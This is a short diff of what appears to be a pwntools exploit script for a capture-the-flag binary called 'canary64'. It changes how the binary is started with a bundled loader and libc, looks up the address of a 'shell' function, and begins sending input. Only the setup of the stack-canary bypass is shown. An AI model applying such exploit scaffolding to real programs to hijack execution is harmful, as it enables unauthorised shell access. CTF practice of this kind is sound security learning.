@@ -1,6 +1,7 @@
 from pwn import *
 context(log_level='debug',os ='linux',arch='amd64')
-p = process(['./canary64'],env={"LD_RELOAD":"./libc.so.6"})
+pfile = "./ld-linux-x86-64.so.2 --library-path ./ ./canary64"
+p = process(pfile.split())
 elf = ELF('./canary64')
 shelladdr = elf.symbols['shell']
 p.sendline('a')
